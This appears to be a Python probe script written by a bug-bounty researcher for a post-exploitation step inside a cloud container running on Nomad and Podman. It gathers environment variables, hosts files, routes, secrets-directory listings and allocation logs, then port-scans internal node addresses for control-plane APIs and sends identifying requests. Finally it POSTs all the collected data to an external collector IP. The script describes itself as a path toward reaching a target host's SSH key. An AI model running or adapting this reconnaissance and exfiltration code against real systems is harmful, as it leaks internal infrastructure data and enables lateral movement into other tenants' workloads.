#!/usr/bin/env python3
"""probe9 - the missing link: is the NODE's control plane reachable from inside a container?

The chain being tested: we already have code execution in an Aiven runtime container (root, and on
infrastructure whose ULA shares a range with the in-scope service's ULA). Orchestration on that host is
Nomad + Podman - we saw `/secrets/.nomad-mount` and `/alloc/logs/{preflight,sidecar,run,pod}.*`. If the
node's own control plane (Nomad HTTP API :4646, Consul :8500, a container-runtime socket over TCP) is
reachable from inside an allocation, then one hop reaches every allocation on that node - including the
target service's - which is the shortest credible path to reading the flag host's SSH key.

So this probe: (1) collect local intelligence that names node endpoints (hosts file, gateway, allocation
logs, env, mounts), (2) scan the node-side addresses on control-plane ports, (3) for anything that
answers, make ONE identifying request and record the first bytes.

Hard rule observed here: identify, do not enumerate. If a control plane turns out to be unauthenticated
and would expose OTHER tenants' allocations, that is a platform finding to report - not something to
read through.
"""
from __future__ import annotations

import json
import os
import re
import socket
import struct
import subprocess
import threading
import time
from http.server import BaseHTTPRequestHandler, HTTPServer

COLLECTOR = "http://208.87.134.252:9200/rt9"
SERVICE_ULA = "fda7:a938:5bfe:5fa6:0:5e9:cd8f:2191"      # the in-scope service's own ULA (cert SAN)
RESEARCHER_ULA = "fda7:a938:5bfe:5fa6:0:5e4:c451:eba9"   # a different /80 - possibly a node-side address
PORTS = [22, 80, 443, 2375, 2376, 2379, 2380, 4001, 4646, 4647, 4648, 5000, 5432, 6443, 7300, 8000,
         8080, 8300, 8301, 8500, 8501, 8502, 8503, 8600, 8888, 9000, 9001, 9090, 9100, 9104, 9187,
         10250, 10255, 14857, 14858, 4317, 4318]
RESULTS = {"stage": "init", "facts": {}, "hosts_tested": {}, "open": {}, "identify": {}, "notes": []}
LOCK = threading.Lock()


def sh(cmd, t=10):
    try:
        r = subprocess.run(["/bin/sh", "-c", cmd], capture_output=True, text=True, timeout=t)
        return (r.stdout + r.stderr).strip()[:1500]
    except Exception as e:                                              # noqa: BLE001
        return "ERR %s" % e


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(RESULTS, indent=1).encode())

    def log_message(self, *a):
        pass


threading.Thread(target=lambda: HTTPServer(("0.0.0.0", int(os.environ.get("PORT", "8080"))), H).serve_forever(),
                 daemon=True).start()
time.sleep(2)

# ---- 1. local intelligence that can name node endpoints
RESULTS["facts"] = {
    "hosts": sh("cat /etc/hosts"),
    "resolv": sh("cat /etc/resolv.conf"),
    "route4": sh("ip route 2>/dev/null"),
    "route6": sh("ip -6 route 2>/dev/null | head -8"),
    "ip4": sh("ip -4 addr 2>/dev/null | grep inet"),
    "ip6": sh("ip -6 addr 2>/dev/null | grep inet6 | head -4"),
    "env_names": sh("env | cut -d= -f1 | sort | tr '\\n' ' '"),
    "env_interesting": sh("env | grep -iE 'nomad|consul|host|node|sidecar|preflight|api|url|endpoint' | head -20"),
    "secrets": sh("ls -la /secrets/ 2>&1 | head -20"),
    "alloc_logs": sh("ls -la /alloc/logs/ 2>&1 | head -20"),
    "preflight_log": sh("tail -c 1500 /alloc/logs/preflight.stderr 2>/dev/null || tail -c 1500 /alloc/logs/preflight.stdout 2>/dev/null"),
    "sidecar_log": sh("tail -c 1500 /alloc/logs/sidecar.stderr 2>/dev/null || tail -c 1500 /alloc/logs/sidecar.stdout 2>/dev/null"),
    "mounts": sh("grep -E 'aiven|nomad|secret|sock' /proc/self/mountinfo 2>/dev/null | head -12"),
    "listen_inside": sh("(ss -ltn 2>/dev/null || netstat -ltn 2>/dev/null) | head -12"),
}

# node-side addresses worth trying: the host gateway from /etc/hosts, the v4 gateway, our own node's ULA
hosts = {"host-gateway-4": "169.254.1.2", "gw-4": "10.150.0.1", "service-ula": SERVICE_ULA,
         "researcher-ula": RESEARCHER_ULA, "service-v4": "10.1.8.115", "ctf-public(control)": "193.122.235.156"}
m = re.search(r"(fda7:[0-9a-f:]+)\s+\S*aiven-application-infrastructure", RESULTS["facts"].get("hosts", ""))
if m:
    hosts["our-node-ula"] = m.group(1)
m2 = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+\S*pod-", RESULTS["facts"].get("hosts", ""))
if m2:
    hosts["our-pod-v4"] = m2.group(1)
RESULTS["hosts_tested"] = hosts


def tcp(host, port, timeout=2.5):
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    s = socket.socket(fam, socket.SOCK_STREAM)
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((host, port))
        s.close()
        return {"state": "open", "ms": int((time.time() - t0) * 1000)}
    except socket.timeout:
        return {"state": "timeout"}
    except OSError as e:
        return {"state": type(e).__name__, "ms": int((time.time() - t0) * 1000)}


def identify(host, port):
    """One identifying request only - enough to name the service, no enumeration."""
    paths = {4646: "/v1/agent/self", 8500: "/v1/agent/self", 2375: "/version", 2376: "/version",
             2379: "/version", 10250: "/healthz", 9090: "/-/healthy", 9100: "/metrics", 5432: None}
    fam = socket.AF_INET6 if ":" in host else socket.AF_INET
    try:
        s = socket.socket(fam, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((host, port))
        if port == 5432:
            s.sendall(struct.pack("!ii", 8, 80877103))
            return "pg? reply=%r" % s.recv(4)
        path = paths.get(port, "/")
        req = ("GET %s HTTP/1.0\r\nHost: %s\r\nUser-Agent: aiven-bugbounty/1.0 (Bugcrowd-zllr; researcher: zllr)\r\n"
               "X-Security-Testing: @zllr\r\nX-Bugcrowd-Researcher: zllr\r\n\r\n" % (path, host))
        s.sendall(req.encode())
        d = s.recv(400)
        s.close()
        return "%s -> %r" % (path, d[:220])
    except Exception as e:                                              # noqa: BLE001
        return "%s: %s" % (type(e).__name__, str(e)[:60])


def scan(host, label):
    for port in PORTS:
        r = tcp(host, port)
        if r["state"] == "open":
            with LOCK:
                RESULTS["open"]["%s:%d" % (label, port)] = r
            RESULTS["identify"]["%s:%d" % (label, port)] = identify(host, port)


RESULTS["stage"] = "scanning"
threads = []
for label, host in hosts.items():
    t = threading.Thread(target=scan, args=(host, label), daemon=True)
    t.start()
    threads.append(t)
for t in threads:
    t.join()

RESULTS["stage"] = "done"
RESULTS["finished"] = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())
body = json.dumps(RESULTS)
try:
    import urllib.request
    urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=body.encode(),
                                                  headers={"Content-Type": "application/json"}), timeout=20)
except Exception as e:                                                  # noqa: BLE001
    print("collector post failed:", e)
print(json.dumps(RESULTS)[:2500])
while True:
    time.sleep(60)
